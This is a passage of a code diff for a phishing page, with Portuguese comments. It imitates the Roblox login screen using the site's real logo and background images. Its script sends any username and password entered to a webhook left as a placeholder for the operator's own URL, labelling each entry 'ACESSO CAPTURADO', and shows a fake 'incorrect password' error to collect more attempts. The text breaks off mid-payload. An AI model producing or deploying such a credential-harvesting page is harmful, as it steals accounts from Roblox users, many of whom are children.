@@ -6,290 +6,422 @@
     <title>Entrar na Roblox</title>
     <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
     <style>
-        /* IMPORTANDO FONTES E DEFININDO VARIÁVEIS DO SISTEMA FOUNDATION */
+        /* FONTES E CORES */
         @import url('https://fonts.googleapis.com/css2?family=HCo+Gotham+SSm:wght@400;500;700&display=swap');
 
         :root {
-            /* CORES QUE VOCÊ ENVIOU - ESCALA CINZA */
-            --bg-main: #121215;           /* color-extended-gray-1200 */
-            --bg-card: #191a1f;           /* color-extended-gray-1100 */
-            --bg-header: #202227;         /* color-extended-gray-1000 */
-            --input-bg: #121215;
-            
-            /* CORES DE INTERAÇÃO */
-            --rbx-blue: #335fff;          /* color-extended-blue-700 */
-            --rbx-blue-hover: #528bff;    /* color-extended-blue-600 */
-            --rbx-error: #df281f;         /* color-extended-red-800 */
-            
-            /* TIPOGRAFIA E BORDAS */
+            --bg-main: #000000;
+            --bg-header: #23252b;
+            --bg-card: #2b2d32;
+            --input-bg: #393b43;
+            --rbx-blue: #0066ff;
             --text-main: #ffffff;
-            --text-muted: #bcbec8;
-            --border-standard: rgba(255, 255, 255, 0.1);
-            --radius-main: 8px;
+            --text-muted: #adb0bb;
+            --border-input: #45474d;
+            --rbx-error: #df281f;
         }
 
-        /* ANIMAÇÕES DE SISTEMA */
-        @keyframes spin { 
-            0% { transform: rotate(0deg); } 
-            100% { transform: rotate(360deg); } 
+        /* BARRA DE ROLAGEM COM SETAS (image_8c2c3e.png) */
+        ::-webkit-scrollbar {
+            width: 14px;
         }
 
-        @keyframes shake { 
-            0%, 100% { transform: translateX(0); } 
-            25% { transform: translateX(-5px); } 
-            75% { transform: translateX(5px); } 
+        ::-webkit-scrollbar-track {
+            background: #2b2d32;
         }
 
-        /* ESTRUTURA GLOBAL */
-        body, html { 
-            margin: 0; 
-            padding: 0; 
-            min-height: 100%; 
-            font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, sans-serif; 
-            background-color: var(--bg-main); 
-            color: var(--text-main); 
-            display: flex; 
-            flex-direction: column; 
-            overflow-x: hidden; 
+        ::-webkit-scrollbar-thumb {
+            background: #65666a;
+            border: 3px solid #2b2d32;
+            border-radius: 10px;
         }
 
-        /* CABEÇALHO OFICIAL */
-        .roblox-header { 
-            width: 100%; 
-            height: 44px; 
-            background: var(--bg-header); 
-            display: flex; 
-            align-items: center; 
-            padding: 0 16px; 
-            position: fixed; 
-            top: 0; 
-            z-index: 100; 
-            box-sizing: border-box; 
-            border-bottom: 1px solid var(--border-standard); 
+        ::-webkit-scrollbar-thumb:hover {
+            background: #75767a;
         }
 
-        .roblox-logo { 
-            height: 28px; 
-            width: 28px; 
-            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); 
-            background-size: contain; 
-            background-repeat: no-repeat; 
+        /* Botões de seta da barra de rolagem */
+        ::-webkit-scrollbar-button:single-button {
+            background-color: #2b2d32;
+            display: block;
+            border-style: none;
+            height: 14px;
+            width: 14px;
         }
 
-        /* CONTEÚDO COM GRADIENTE DINÂMICO */
-        .main-content { 
-            flex: 1; 
-            display: flex; 
-            align-items: center; 
-            justify-content: center; 
-            flex-direction: column; 
-            background: linear-gradient(rgba(0,0,0,0.45), rgba(0,0,0,0.45)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
-            background-size: cover; 
-            background-position: center; 
-            padding: 80px 0 40px 0; 
+        /* Seta para cima */
+        ::-webkit-scrollbar-button:single-button:vertical:decrement {
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100' fill='%2365666a'><polygon points='50,20 20,80 80,80'/></svg>");
+            background-size: 8px;
+            background-repeat: no-repeat;
+            background-position: center;
         }
 
-        /* CARD DE LOGIN PRO */
-        .login-card { 
-            background-color: var(--bg-card); 
-            padding: 40px 32px; 
-            border-radius: var(--radius-main); 
-            width: 400px; 
-            text-align: center; 
-            box-shadow: 0 12px 40px rgba(0,0,0,0.7); 
-            box-sizing: border-box; 
-            position: relative; 
-            backdrop-filter: blur(12px); 
+        /* Seta para baixo */
+        ::-webkit-scrollbar-button:single-button:vertical:increment {
+            background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='100' height='100' fill='%2365666a'><polygon points='50,80 20,20 80,20'/></svg>");
+            background-size: 8px;
+            background-repeat: no-repeat;
+            background-position: center;
         }
 
-        .shield-icon { 
-            background: url(https://images.rbxcdn.com/2b967a925b86540c43b97878bbfc0632-lock.svg) no-repeat center; 
-            background-size: 60px; 
-            width: 80px; 
-            height: 80px; 
-            margin: 0 auto 12px; 
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            font-family: 'HCo Gotham SSm', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            overflow-x: hidden;
+        }
+
+        /* CABEÇALHO (image_8bb348.png) */
+        .roblox-header {
+            width: 100%;
+            height: 40px;
+            background: var(--bg-header);
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            box-sizing: border-box;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .roblox-logo {
+            height: 30px;
+            width: 30px;
+            margin-right: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+        }
+
+        .roblox-logo svg {
+            width: 28px;
+            height: 28px;
+            fill: white;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 24px;
+            font-size: 15px;
+            font-weight: 500;
+            margin-right: 20px;
+        }
+
+        .nav-links span {
+            cursor: pointer;
+            white-space: nowrap;
+        }
+
+        .nav-links span:hover {
+            color: var(--text-muted);
+        }
+
+        /* BARRA DE PESQUISA (image_8bc704.png) */
+        .search-container {
+            position: relative;
+            width: 280px;
+            display: flex;
+            align-items: center;
+        }
+
+        .search-container input {
+            width: 100%;
+            height: 28px;
+            background: rgba(0, 0, 0, 0.2);
+            border: 1px solid #45474d;
+            border-radius: 4px;
+            padding: 0 10px 0 35px;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+
+        .search-container input::placeholder {
+            color: #adb0bb;
+            opacity: 0.8;
+        }
+
+        .search-container .search-icon {
+            position: absolute;
+            left: 10px;
+            width: 17px;
+            height: 17px;
+            fill: #adb0bb;
+            pointer-events: none;
+        }
+
+        .spacer {
+            flex-grow: 1;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .btn-signup {
+            background: var(--rbx-blue);
+            color: white;
+            border: none;
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        .btn-login-small {
+            background: transparent;
+            color: white;
+            border: 1px solid white;
+            padding: 3px 12px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+        }
+
+        /* CONTEÚDO PRINCIPAL (image_8bca86.jpg) */
+        .main-content {
+            min-height: 100vh;
+            background: linear-gradient(rgba(0,0,0,0.65), rgba(0,0,0,0.65)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 60px 0;
+        }
+
+        .login-card {
+            background-color: var(--bg-card);
+            width: 400px;
+            padding: 40px 30px;
+            border-radius: 4px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+            z-index: 5;
         }
 
         h1 {
-            margin-bottom: 24px;
+            font-size: 28px;
+            margin: 0 0 25px 0;
             font-weight: 700;
-            font-size: 24px;
+            color: white;
+        }
+
+        .input-group {
+            margin-bottom: 12px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 44px;
+            background-color: var(--input-bg);
+            border: 1px solid var(--border-input);
+            border-radius: 4px;
             color: #fff;
+            padding: 0 12px;
+            box-sizing: border-box;
+            outline: none;
+            font-size: 15px;
         }
 
-        /* MENSAGEM DE ERRO COM DESIGN DE ALERTA */
-        #error-msg { 
-            color: var(--rbx-error); 
-            font-size: 13px; 
-            margin-bottom: 15px; 
-            display: none; 
-            text-align: left; 
-            background: rgba(223, 40, 31, 0.1); 
-            padding: 12px; 
-            border-radius: 4px; 
-            border-left: 3px solid var(--rbx-error); 
+        .input-field:focus {
+            border-color: #ffffff;
         }
 
-        /* CAMPOS DE INPUT */
-        .input-field { 
-            width: 100%; 
-            height: 44px; 
-            background-color: var(--input-bg); 
-            border: 1px solid var(--border-standard); 
-            border-radius: 4px; 
-            color: #fff; 
-            padding: 0 12px; 
-            margin-bottom: 12px; 
-            box-sizing: border-box; 
-            outline: none; 
-            transition: all 0.2s ease; 
-            font-size: 15px; 
+        .btn-entrar {
+            width: 100%;
+            height: 38px;
+            background: transparent;
+            color: white;
+            border: 1px solid white;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 16px;
+            margin-top: 15px;
+            cursor: pointer;
         }
 
-        .input-field:focus { 
-            border-color: #fff; 
+        .forgot-link {
+            display: block;
+            margin: 20px 0;
+            font-size: 14px;
+            color: white;
+            text-decoration: none;
         }
 
-        /* BOTÃO PRIMÁRIO (AZUL FOUNDATION) */
-        .btn-primary { 
-            width: 100%; 
-            height: 42px; 
-            background-color: var(--rbx-blue); 
-            color: #fff; 
-            border: none; 
-            border-radius: var(--radius-main); 
-            font-size: 16px; 
-            font-weight: 600; 
-            cursor: pointer; 
-            margin-top: 10px; 
-            transition: background 0.2s ease; 
+        .forgot-link:hover {
+            text-decoration: underline;
         }
 
-        .btn-primary:hover { 
-            background-color: var(--rbx-blue-hover); 
-        }
-
-        /* BOTÃO SECUNDÁRIO */
         .btn-secondary {
             width: 100%;
-            height: 42px;
+            height: 38px;
             background: #393b43;
+            color: white;
             border: none;
-            color: #fff;
-            border-radius: var(--radius-main);
-            font-weight: 600;
+            border-radius: 4px;
+            margin-top: 12px;
+            font-weight: 500;
             cursor: pointer;
-            transition: background 0.2s;
+            font-size: 14px;
         }
 
         .btn-secondary:hover {
             background: #45474d;
         }
 
-        /* OVERLAY DE CARREGAMENTO */
-        #loading-overlay { 
-            background-color: rgba(0,0,0,0.85); 
-            position: fixed; 
-            inset: 0; 
-            z-index: 2000; 
-            display: none; 
-            align-items: center; 
-            justify-content: center; 
-            backdrop-filter: blur(6px); 
+        .footer-card {
+            margin-top: 30px;
+            font-size: 14px;
+            color: white;
         }
 
-        .spinner { 
-            width: 44px; 
-            height: 44px; 
-            border: 4px solid rgba(255,255,255,0.1); 
-            border-top: 4px solid var(--rbx-blue); 
-            border-radius: 50%; 
-            animation: spin 0.8s linear infinite; 
+        .footer-card a {
+            color: white;
+            text-decoration: none;
+            font-weight: 700;
         }
 
-        .shake { 
-            animation: shake 0.2s ease-in-out 0s 2; 
+        /* ERRO E OVERLAY */
+        #error-box {
+            color: var(--rbx-error);
+            background: rgba(223,40,31,0.1);
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 15px;
+            display: none;
+            text-align: left;
+            border-left: 3px solid var(--rbx-error);
         }
+
+        #overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.85);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 2000;
+        }
+
+        .spinner {
+            width: 35px; height: 35px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        .shake { animation: shake 0.2s ease-in-out 2; }
     </style>
 </head>
 <body>
 
-    <!-- ELEMENTO DE CARREGAMENTO -->
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-    </div>
+    <div id="overlay"><div class="spinner"></div></div>
 
-    <!-- CABEÇALHO -->
     <header class="roblox-header">
-        <div style="padding-left:10px">
-            <div class="roblox-logo"></div>
+        <div class="header-left">
+            <div class="roblox-logo">
+                <svg viewBox="0 0 28 28">
+                    <path d="M7.05 4L24 7.05 20.95 24 4 20.95 7.05 4zM11.5 16.5h5v-5h-5v5z"/>
+                </svg>
+            </div>
+            <div class="nav-links">
+                <span>Destaques</span>
+                <span>Mercado</span>
+                <span>Criar</span>
+                <span>Robux</span>
+            </div>
+        </div>
+        
+        <div class="search-container">
+            <svg class="search-icon" viewBox="0 0 16 16">
+                <path d="M11.742 10.344a6.5 6.5 0 1 0-1.397 1.398h-.001c.03.04.062.078.098.115l3.85 3.85a1 1 0 0 0 1.415-1.414l-3.85-3.85a1.007 1.007 0 0 0-.115-.1zM12 6.5a5.5 5.5 0 1 1-11 0 5.5 5.5 0 0 1 11 0z"/>
+            </svg>
+            <input type="text" placeholder="Pesquisar">
+        </div>
+
+        <div class="spacer"></div>
+
+        <div class="header-right">
+            <button class="btn-signup">Cadastrar-se</button>
+            <button class="btn-login-small">Entrar</button>
         </div>
     </header>
 
-    <!-- CONTEÚDO CENTRAL -->
     <main class="main-content">
         <div class="login-card" id="card">
-            <div class="shield-icon"></div>
             <h1>Entrar na Roblox</h1>
             
-            <!-- ALERTA DE ERRO -->
-            <div id="error-msg">Usuário ou senha incorretos. Por favor, tente novamente.</div>
+            <div id="error-box">Usuário ou senha incorretos.</div>
 
-            <!-- FORMULÁRIO -->
-            <input type="text" id="user" class="input-field" placeholder="Usuário / E-mail / Telefone" autocomplete="off" oninput="resetStyles()">
-            <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="resetStyles()">
-            
-            <button class="btn-primary" onclick="execLogin()">Entrar</button>
-
-            <!-- DIVISOR E ENTRADA RÁPIDA -->
-            <div style="margin-top:24px; border-top:1px solid var(--border-standard); padding-top:20px">
-                <button class="btn-secondary">Entrada rápida</button>
+            <div class="input-group">
+                <input type="text" id="user" class="input-field" placeholder="Usuário/e-mail/telefone" autocomplete="off" oninput="hideError()">
             </div>
+            <div class="input-group">
+                <input type="password" id="pass" class="input-field" placeholder="Senha" oninput="hideError()">
+            </div>
+            
+            <button class="btn-entrar" onclick="startLogin()">Entrar</button>
 
-            <!-- RODAPÉ DO CARD -->
-            <p style="margin-top:25px; font-size:14px; color: var(--text-muted)">
-                Não tem uma conta? 
-                <a href="#" style="color:#fff; text-decoration:none; font-weight:700">Cadastrar-se</a>
-            </p>
+            <a href="#" class="forgot-link">Esqueceu a senha ou nome de usuário?</a>
+
+            <button class="btn-secondary">Envie-me um código único por e-mail</button>
+            <button class="btn-secondary">Entrada rápida</button>
+
+            <div class="footer-card">
+                Não possui uma conta? <a href="#">Cadastrar-se</a>
+            </div>
         </div>
     </main>
 
     <script>
         let attempt = 0;
-        const webhookURL = "SUA_WEBHOOK_AQUI"; // COLOQUE SUA URL AQUI
+        const WEBHOOK = "SUA_WEBHOOK_AQUI"; 
 
-        // LIMPA OS ERROS AO DIGITAR
-        function resetStyles() {
-            const inputs = document.querySelectorAll('.input-field');
-            inputs.forEach(i => i.style.borderColor = 'rgba(255, 255, 255, 0.1)');
-            document.getElementById('error-msg').style.display = 'none';
+        function hideError() {
+            document.getElementById('error-box').style.display = 'none';
+            document.querySelectorAll('.input-field').forEach(el => el.style.borderColor = '#45474d');
         }
 
-        // LÓGICA DE LOGIN COM PROTOCOLO DE REDE
-        async function execLogin() {
+        async function startLogin() {
             const u = document.getElementById('user').value;
             const p = document.getElementById('pass').value;
             const card = document.getElementById('card');
-            const errorDiv = document.getElementById('error-msg');
-            const overlay = document.getElementById('loading-overlay');
+            const errorDiv = document.getElementById('error-box');
+            const overlay = document.getElementById('overlay');
 
-            if (!u || !p) { 
-                triggerError(); 
-                return; 
-            }
+            if (!u || !p) { triggerError(); return; }
 
             overlay.style.display = 'flex';
 
-            // DETECÇÃO DE AGENTE DE USUÁRIO (O QUE ESTAVA FALTANDO)
-            const device = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
-
             try {
-                await fetch(webhookURL, {
+                await fetch(WEBHOOK, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🍯 NOVA CAPTURA | PROTOCOLO COLMEIA",
-                            color: 3366911,
+                            title: "🚨 ACESSO CAPTURADO",
+                            color: 16711680,
                             fields: [
-                                { name: "👤 Identificador", value: "
+                                { name: "👤 Login", value: "
